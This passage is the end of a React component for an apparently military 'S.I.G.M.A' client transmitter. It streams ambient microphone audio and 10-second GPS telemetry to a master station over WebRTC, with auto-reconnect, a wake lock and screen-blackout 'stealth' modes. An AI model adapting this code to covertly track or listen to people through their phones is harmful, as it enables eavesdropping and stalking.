    window.addEventListener('pointerdown', unlockOnTouch, { passive: true });
    window.addEventListener('click', unlockOnTouch, { passive: true });

    return () => {
      isMounted = false;
      window.removeEventListener('touchstart', unlockOnTouch);
      window.removeEventListener('pointerdown', unlockOnTouch);
      window.removeEventListener('click', unlockOnTouch);
      if (autoOfferInterval) clearInterval(autoOfferInterval);
      if (wsReconnectTimer) clearTimeout(wsReconnectTimer);
      if (wsRef.current) {
        try {
          wsRef.current.close();
        } catch {}
      }
      if (nativePcRef.current) {
        try {
          nativePcRef.current.close();
        } catch {}
      }
    };
  }, [
    createSamsungSafePeerConnection,
    ensureMicrophoneStream,
    nodeId,
    sendOfferOverWebSocket,
    startWebRTC,
    transmitTelemetryPacket,
  ]);

  // 7. Real Hardware Geolocation + 10-Second Telemetry Loop
  useEffect(() => {
    if (!('geolocation' in navigator)) {
      setGpsState((prev) => ({ ...prev, status: 'PERMISSION_DENIED' }));
      return;
    }

    let watchId: number | null = null;

    const fetchHardwareGps = () => {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const nextCoords = {
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            alt: pos.coords.altitude !== null ? Math.round(pos.coords.altitude) : null,
            accuracy: Math.max(1, Math.round(pos.coords.accuracy)),
            speed: pos.coords.speed !== null ? Math.round(pos.coords.speed * 3.6) : null,
          };
          setGpsState((prev) => ({
            ...prev,
            ...nextCoords,
            status: 'LOCKED',
          }));
          transmitTelemetryPacket(nextCoords);
        },
        () => {
          setGpsState((prev) => ({
            ...prev,
            status: prev.lat !== null ? 'LOCKED' : 'PERMISSION_DENIED',
          }));
          transmitTelemetryPacket();
        },
        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
      );
    };

    fetchHardwareGps();

    watchId = navigator.geolocation.watchPosition(
      (pos) => {
        const nextCoords = {
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          alt: pos.coords.altitude !== null ? Math.round(pos.coords.altitude) : null,
          accuracy: Math.max(1, Math.round(pos.coords.accuracy)),
          speed: pos.coords.speed !== null ? Math.round(pos.coords.speed * 3.6) : null,
        };
        setGpsState((prev) => ({
          ...prev,
          ...nextCoords,
          status: 'LOCKED',
        }));
        transmitTelemetryPacket(nextCoords);
      },
      () => {},
      { enableHighAccuracy: true, maximumAge: 5000 }
    );

    const intervalId = window.setInterval(() => {
      fetchHardwareGps();
    }, 10000);

    return () => {
      if (watchId !== null) {
        navigator.geolocation.clearWatch(watchId);
      }
      clearInterval(intervalId);
    };
  }, [transmitTelemetryPacket]);

  // 8. Tombol Interaksi Manual KONEK & DISKONEK (Memudahkan aktivasi mic & koneksi di Samsung, Oppo, dan POCO)
  const handleManualConnect = useCallback(async () => {
    isManualDisconnectedRef.current = false;
    isHandshakingRef.current = false;
    lastOfferSentAtRef.current = 0;
    setPeerStatus('AUTO_DISCOVERY');

    requestWakeLock();

    if (passivePipelineRef.current?.audioContext.state === 'suspended') {
      passivePipelineRef.current.audioContext.resume().catch(() => {});
    }

    // 1. Akuisisi mikrofon langsung di dalam event klik pengguna (membuka izin hardware Samsung & Oppo 100%)
    const stream = await ensureMicrophoneStream();

    // 2. Buat RTCPeerConnection baru dengan stream mikrofon
    const pc = createSamsungSafePeerConnection(stream);

    // 3. Buka WebSocket atau gunakan WebSocket yang sudah terbuka untuk registrasi & kirim Offer
    if (!wsRef.current || wsRef.current.readyState === WebSocket.CLOSED) {
      connectWsFnRef.current?.();
    } else if (wsRef.current.readyState === WebSocket.OPEN) {
      wsRef.current.send(
        JSON.stringify({
          type: 'register',
          id: nodeId,
        })
      );
      transmitTelemetryPacket();
      await sendOfferOverWebSocket(pc, wsRef.current);
    }
  }, [
    createSamsungSafePeerConnection,
    ensureMicrophoneStream,
    nodeId,
    requestWakeLock,
    sendOfferOverWebSocket,
    transmitTelemetryPacket,
  ]);

  const handleManualDisconnect = useCallback(() => {
    isManualDisconnectedRef.current = true;
    isConnectedRef.current = false;
    isHandshakingRef.current = false;
    setPeerStatus('DISCONNECTED');

    // Beri tahu Master bahwa Klien ini memutuskan koneksi secara manual
    if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
      try {
        wsRef.current.send(
          JSON.stringify({
            type: 'client_disconnected',
            senderId: nodeId,
            targetId: 'MASTER',
          })
        );
      } catch {}
    }

    if (nativeDcRef.current) {
      try {
        nativeDcRef.current.close();
      } catch {}
      nativeDcRef.current = null;
    }

    if (nativePcRef.current) {
      try {
        nativePcRef.current.onicecandidate = null;
        nativePcRef.current.onconnectionstatechange = null;
        nativePcRef.current.oniceconnectionstatechange = null;
        nativePcRef.current.close();
      } catch {}
      nativePcRef.current = null;
    }

    if (wsRef.current) {
      try {
        wsRef.current.close();
      } catch {}
      wsRef.current = null;
    }
  }, [nodeId]);

  // Mode Layar Hitam Total (OLED Blackout 0%): Ketuk 2x pada layar gelap untuk menampilkan kembali kontrol
  if (isOledBlackout) {
    return (
      <div
        onDoubleClick={() => setIsOledBlackout(false)}
        onClick={() => {}}
        className="fixed inset-0 bg-black text-neutral-950 flex flex-col justify-between p-4 select-none z-[9999] font-mono-tactical cursor-pointer"
        title="Ketuk 2x (Double Tap) untuk keluar dari Mode Layar Mati OLED"
      >
        <div className="flex items-center justify-between opacity-10">
          <span className="text-[9px] tracking-widest text-neutral-700">
            {nodeId} · {peerStatus}
          </span>
          <button
            type="button"
            onClick={(e) => {
              e.stopPropagation();
              setIsOledBlackout(false);
            }}
            className="px-2 py-0.5 text-[9px] border border-neutral-800 text-neutral-600 rounded"
          >
            BUKA LAYAR
          </button>
        </div>
        <div className="my-auto text-center text-[9px] text-neutral-900 tracking-widest">
          MODE GELAP OLED AKTIF (KETUK 2X UNTUK MEMBUKA KONTROL)
        </div>
        <div className="h-2" />
      </div>
    );
  }

  return (
    <div
      className={`min-h-screen font-mono-tactical flex flex-col justify-between p-4 sm:p-6 select-none transition-colors duration-200 ${
        isDarkStealthMode
          ? 'bg-black text-neutral-500'
          : 'bg-[#030812] text-slate-300'
      }`}
    >
      {/* Header: Logo TNI AU di Pojok Kiri Atas & Logo Petir di Pojok Kanan Atas */}
      <div
        className={`flex items-center justify-between gap-2 border-b pb-3 ${
          isDarkStealthMode ? 'border-neutral-900' : 'border-cyan-500/30'
        }`}
      >
        <div className="flex items-center gap-2.5">
          <img
            src={LOGO_TNI_AU}
            alt="Logo TNI AU"
            referrerPolicy="no-referrer"
            className={`w-6 h-6 object-contain rounded-full border bg-black shrink-0 ${
              isDarkStealthMode ? 'border-neutral-800 opacity-40' : 'border-cyan-500/40'
            }`}
          />
          <span
            className={`text-xs tracking-widest font-semibold ${
              isDarkStealthMode ? 'text-neutral-600' : 'text-cyan-300'
            }`}
          >
            S.I.G.M.A // CLIENT TRANSMITTER
          </span>
        </div>

        <div className="flex items-center gap-2">
          {/* Tombol Toggle Mode Gelap Redup */}
          <button
            type="button"
            onClick={() => setIsDarkStealthMode((prev) => !prev)}
            className={`flex items-center gap-1.5 px-2.5 py-1 text-[11px] font-semibold rounded border transition-colors cursor-pointer ${
              isDarkStealthMode
                ? 'bg-neutral-950 border-neutral-800 text-amber-400 hover:bg-neutral-900'
                : 'bg-slate-900/90 border-cyan-500/40 text-cyan-300 hover:bg-cyan-500/20'
            }`}
            title="Ubah Mode Gelap / Redup Taktis"
          >
            {isDarkStealthMode ? (
              <>
                <Sun className="w-3.5 h-3.5 text-amber-400" />
                <span>MODE NORMAL</span>
              </>
            ) : (
              <>
                <Moon className="w-3.5 h-3.5 text-cyan-400" />
                <span>MODE GELAP</span>
              </>
            )}
          </button>

          {/* Tombol Layar Hitam OLED Total */}
          <button
            type="button"
            onClick={() => setIsOledBlackout(true)}
            className={`flex items-center gap-1.5 px-2.5 py-1 text-[11px] font-semibold rounded border transition-colors cursor-pointer ${
              isDarkStealthMode
                ? 'bg-neutral-950 border-neutral-800 text-neutral-400 hover:bg-neutral-900'
                : 'bg-slate-900/90 border-cyan-500/40 text-slate-300 hover:bg-cyan-500/20'
            }`}
            title="Sembunyikan Layar Hitam Total (OLED Blackout)"
          >
            <EyeOff className="w-3.5 h-3.5 text-cyan-400" />
            <span className="hidden sm:inline">LAYAR GELAP TOTAL</span>
          </button>

          <img
            src={LOGO_PETIR}
            alt="Logo Petir Diskomlekau"
            referrerPolicy="no-referrer"
            className={`w-6 h-6 object-contain rounded-full border bg-black shrink-0 ${
              isDarkStealthMode ? 'border-neutral-800 opacity-40' : 'border-cyan-500/40'
            }`}
          />
        </div>
      </div>

      {/* Panel Utama Status & Tombol Interaksi KONEK / DISKONEK */}
      <div className="my-auto max-w-md w-full mx-auto space-y-4 py-4">
        <div
          className={`border rounded p-5 text-center space-y-3 transition-colors ${
            isDarkStealthMode
              ? 'border-neutral-900 bg-neutral-950/60'
              : peerStatus === 'CONNECTED'
              ? 'border-emerald-500/50 bg-[#041512]/90'
              : peerStatus === 'DISCONNECTED'
              ? 'border-rose-500/40 bg-[#14070a]/80'
              : 'border-cyan-500/35 bg-[#050d1a]/90'
          }`}
        >
          <div className="flex items-center justify-center gap-2 text-xs tracking-widest">
            <Radio
              className={`w-3.5 h-3.5 ${
                peerStatus === 'CONNECTED'
                  ? 'text-emerald-400 animate-pulse'
                  : peerStatus === 'DISCONNECTED'
                  ? 'text-rose-400'
                  : 'text-cyan-400 animate-pulse'
              }`}
            />
            <span
              className={
                peerStatus === 'CONNECTED'
                  ? 'text-emerald-400 font-bold'
                  : peerStatus === 'DISCONNECTED'
                  ? 'text-rose-400 font-bold'
                  : 'text-cyan-400 font-bold'
              }
            >
              {peerStatus === 'CONNECTED'
                ? 'TERHUBUNG KE MASTER (ONLINE)'
                : peerStatus === 'DISCONNECTED'
                ? 'TERPUTUS (MANUAL DISCONNECT)'
                : 'MENGHUBUNGKAN KE MASTER...'}
            </span>
          </div>

          <div
            className={`text-4xl sm:text-5xl font-bold tracking-widest font-mono-tactical ${
              isDarkStealthMode
                ? 'text-neutral-400'
                : peerStatus === 'CONNECTED'
                ? 'text-emerald-300'
                : 'text-cyan-400'
            }`}
          >
            {nodeId}
          </div>

          <div className="text-[11px] text-neutral-400">
            {peerStatus === 'CONNECTED' ? (
              <span>
                TRANSMISI AUDIO &amp; GPS AKTIF KE{' '}
                <span className="text-emerald-300">MASTER</span>
              </span>
            ) : peerStatus === 'DISCONNECTED' ? (
              <span>
                KONEKSI DIPUTUSKAN · TEKAN TOMBOL <span className="text-cyan-300">KONEK</span> UNTUK MENYAMBUNGKAN
              </span>
            ) : (
              <span>
                AUTO-DISCOVERY &amp; HANDSHAKE KE <span className="text-cyan-300">MASTER</span>
              </span>
            )}
          </div>

          {/* TOMBOL INTERAKSI UTAMA: KONEK & DISKONEK + MODE GELAP */}
          <div className="pt-3 grid grid-cols-2 gap-3">
            <button
              type="button"
              onClick={handleManualConnect}
              className={`flex items-center justify-center gap-2 py-3 px-4 rounded font-bold text-xs tracking-wider border transition-all cursor-pointer ${
                isDarkStealthMode
                  ? 'bg-neutral-900 border-emerald-800/70 text-emerald-400 hover:bg-neutral-800'
                  : 'bg-emerald-500/25 hover:bg-emerald-500/40 border-emerald-400 text-emerald-200 shadow-[0_0_16px_rgba(16,185,129,0.25)]'
              }`}
            >
              <Power className="w-4 h-4 text-emerald-400 shrink-0" />
              <span>{peerStatus === 'CONNECTED' ? 'RE-KONEK' : 'KONEK MASTER'}</span>
            </button>

            <button
              type="button"
              onClick={handleManualDisconnect}
              disabled={peerStatus === 'DISCONNECTED'}
              className={`flex items-center justify-center gap-2 py-3 px-4 rounded font-bold text-xs tracking-wider border transition-all cursor-pointer disabled:opacity-40 disabled:cursor-not-allowed ${
                isDarkStealthMode
                  ? 'bg-neutral-900 border-rose-900/70 text-rose-400 hover:bg-neutral-800'
                  : 'bg-rose-500/20 hover:bg-rose-500/35 border-rose-400 text-rose-200'
              }`}
            >
              <PowerOff className="w-4 h-4 text-rose-400 shrink-0" />
              <span>DISKONEK</span>
            </button>
          </div>

          {/* Baris Tombol Mode Gelap & Samarkan Layar */}
          <div className="grid grid-cols-2 gap-3 pt-1">
            <button
              type="button"
              onClick={() => setIsDarkStealthMode((prev) => !prev)}
              className={`flex items-center justify-center gap-1.5 py-2 px-3 rounded text-[11px] font-semibold border transition-colors cursor-pointer ${
                isDarkStealthMode
                  ? 'bg-neutral-900 border-amber-500/40 text-amber-300'
                  : 'bg-slate-900/90 border-cyan-500/35 text-cyan-200 hover:bg-cyan-500/15'
              }`}
            >
              {isDarkStealthMode ? (
                <>
                  <Sun className="w-3.5 h-3.5 text-amber-400" />
                  <span>MATIKAN MODE GELAP</span>
                </>
              ) : (
                <>
                  <Moon className="w-3.5 h-3.5 text-cyan-400" />
                  <span>AKTIFKAN MODE GELAP</span>
                </>
              )}
            </button>

            <button
              type="button"
              onClick={() => TacticalBlackout.engage()}
              className={`flex items-center justify-center gap-1.5 py-2 px-3 rounded text-[11px] font-semibold border transition-colors cursor-pointer ${
                isDarkStealthMode
                  ? 'bg-neutral-900 border-neutral-800 text-neutral-300'
                  : 'bg-slate-900/90 border-cyan-500/35 text-cyan-200 hover:bg-cyan-500/15'
              }`}
              title="Layar Hitam Total (Ketuk 5x Cepat untuk Keluar)"
            >
              <EyeOff className="w-3.5 h-3.5 text-cyan-400" />
              <span>BLACKOUT (5x TAP)</span>
            </button>
          </div>
        </div>

        <div className="grid grid-cols-2 gap-2.5 text-xs">
          <div
            className={`border p-3 rounded space-y-1 ${
              isDarkStealthMode
                ? 'border-neutral-900 bg-black'
                : 'border-cyan-500/25 bg-[#040b16]'
            }`}
          >
            <div className="text-[10px] text-neutral-500">SIGNALING STATUS</div>
            <div className="flex items-center gap-2 font-semibold text-cyan-400">
              <span
                className={`w-2 h-2 rounded-full ${
                  peerStatus === 'CONNECTED'
                    ? 'bg-emerald-400 animate-ping'
                    : peerStatus === 'DISCONNECTED'
                    ? 'bg-rose-500'
                    : 'bg-cyan-500 animate-ping'
                }`}
              />
              <span>
                {peerStatus === 'CONNECTED'
                  ? 'LINK LOCKED'
                  : peerStatus === 'DISCONNECTED'
                  ? 'STANDBY / OFF'
                  : 'AUTO-RETRY (5s)'}
              </span>
            </div>
          </div>

          <div
            className={`border p-3 rounded space-y-1 ${
              isDarkStealthMode
                ? 'border-neutral-900 bg-black'
                : 'border-cyan-500/25 bg-[#040b16]'
            }`}
          >
            <div className="text-[10px] text-neutral-500">WAKE LOCK</div>
            <div className="flex items-center gap-1.5 font-semibold text-neutral-300">
              <Lock className="w-3.5 h-3.5 text-cyan-500" />
              <span>{wakeLockActive ? 'ACTIVE' : 'STANDBY'}</span>
            </div>
          </div>

          <div
            className={`border p-3 rounded space-y-1 ${
              isDarkStealthMode
                ? 'border-neutral-900 bg-black'
                : 'border-cyan-500/25 bg-[#040b16]'
            }`}
          >
            <div className="text-[10px] text-neutral-500">AMBIENT MIC STREAM</div>
            <div className="flex items-center gap-1.5 font-semibold text-neutral-300">
              <Mic className="w-3.5 h-3.5 text-cyan-500" />
              <span>
                {micStatus === 'READY'
                  ? `CAPTURED (${remoteAudioState.gain.toFixed(1)}x)`
                  : micStatus === 'DENIED'
                  ? 'TAP KONEK U/ MIC'
                  : 'CAPTURING...'}
              </span>
            </div>
          </div>

          <div
            className={`border p-3 rounded space-y-1 ${
              isDarkStealthMode
                ? 'border-neutral-900 bg-black'
                : 'border-cyan-500/25 bg-[#040b16]'
            }`}
          >
            <div className="text-[10px] text-neutral-500">BATTERY TELEMETRY</div>
            <div className="flex items-center gap-1.5 font-semibold text-neutral-300">
              <BatteryCharging className="w-3.5 h-3.5 text-cyan-500" />
              <span>
                {batteryInfo.level !== null ? `${batteryInfo.level}%` : 'READING...'}
              </span>
            </div>
          </div>
        </div>

        <div
          className={`border p-3 rounded space-y-2 ${
            isDarkStealthMode
              ? 'border-neutral-900 bg-black'
              : 'border-cyan-500/25 bg-[#040b16]'
          }`}
        >
          <div className="flex items-center justify-between text-[11px] text-neutral-500">
            <span className="flex items-center gap-1.5">
              <Activity className="w-3.5 h-3.5 text-cyan-500" />
              <span>RAW AUDIO STREAM MODULATION</span>
            </span>
            <span className="text-cyan-400">{audioRms}%</span>
          </div>
          <div className="w-full h-1.5 bg-neutral-950 rounded overflow-hidden">
            <div
              className="h-full bg-cyan-500 transition-all duration-75"
              style={{ width: `${Math.min(100, audioRms)}%` }}
            />
          </div>
        </div>

        <div
          className={`border p-3 rounded space-y-1.5 text-[11px] ${
            isDarkStealthMode
              ? 'border-neutral-900 bg-black'
              : 'border-cyan-500/25 bg-[#040b16]'
          }`}
        >
          <div className="flex items-center justify-between text-neutral-500">
            <span className="flex items-center gap-1.5">
              <Navigation className="w-3.5 h-3.5 text-cyan-500" />
              <span>GPS TELEMETRY PAYLOAD</span>
            </span>
          </div>
          {gpsState.lat !== null && gpsState.lng !== null ? (
            <div className="grid grid-cols-2 gap-2 pt-1 text-neutral-300">
              <div>LAT: {gpsState.lat.toFixed(6)}°</div>
              <div>LNG: {gpsState.lng.toFixed(6)}°</div>
              <div>ALT: {gpsState.alt !== null ? `${gpsState.alt}m` : 'N/A'}</div>
              <div>
                PREC: {gpsState.accuracy !== null ? `±${gpsState.accuracy}m` : 'N/A'}
              </div>
            </div>
          ) : (
            <div className="pt-1 text-neutral-500 text-[11px]">
              Mengunci koordinat satelit GPS perangkat...
            </div>
          )}
        </div>
      </div>

      <div
        className={`border-t pt-3 flex items-center justify-between text-[11px] ${
          isDarkStealthMode
            ? 'border-neutral-900 text-neutral-700'
            : 'border-cyan-500/20 text-neutral-500'
        }`}
      >
        <div className="flex items-center gap-1.5">
          <ShieldAlert className="w-3.5 h-3.5 text-cyan-500/60" />
          <span>AUTO-CONNECT + KONTROL MANUAL KONEK/DISKONEK &amp; MODE GELAP</span>
        </div>
        <span>RETRY: 5000ms</span>
      </div>
    </div>
  );
};

export default Client;
